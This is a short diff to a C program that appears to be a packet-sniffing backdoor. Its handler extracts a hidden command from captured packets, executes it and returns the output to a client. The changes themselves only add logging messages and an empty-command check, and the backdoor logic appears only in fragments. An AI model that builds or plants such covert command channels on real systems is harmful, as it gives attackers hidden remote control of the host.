@@ -137,6 +137,7 @@ void client(struct client_opt c_opt){
     
     /* Receive reply and print */
     
+    printf("Waiting for reply...\n");
     int sockfd, n;
     struct sockaddr_in server;
     memset(&server, 0, sizeof(struct sockaddr_in));
@@ -385,7 +386,12 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
     strncpy((char *)bd_command, \
         (char *)(message + BD_KEY_LEN), \
         strlen((char *)message) - (2 * BD_KEY_LEN));
-    printf("Command: %s\n", bd_command);
+    if(strlen((char *)bd_command) == 0){
+        printf("Invalid command: %s\n", bd_command);
+        return;
+    }
+    else
+        printf("Command: %s\n", bd_command);
     
     // Execute command
     FILE *fp;
@@ -394,6 +400,7 @@ void packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char
         printf("Command error!\n");
         return;
     }
+    printf("Command executed.\n");  
     
     /* Send results back to client */
     
